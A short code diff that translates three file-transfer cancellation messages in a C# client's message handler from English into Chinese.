@@ -257,7 +257,7 @@ namespace Rouzzf.Client.Messages
                     client.Send(new FileTransferCancel
                     {
                         Id = message.Id,
-                        Reason = "Error reading file"
+                        Reason = "读取文件错误"
                     });
                 }
                 finally
@@ -276,7 +276,7 @@ namespace Rouzzf.Client.Messages
                 client.Send(new FileTransferCancel
                 {
                     Id = message.Id,
-                    Reason = "Canceled"
+                    Reason = "取消"
                 });
             }
         }
@@ -327,7 +327,7 @@ namespace Rouzzf.Client.Messages
                 client.Send(new FileTransferCancel
                 {
                     Id = message.Id,
-                    Reason = "Error writing file"
+                    Reason = "写文件错误"
                 });
             }
         }
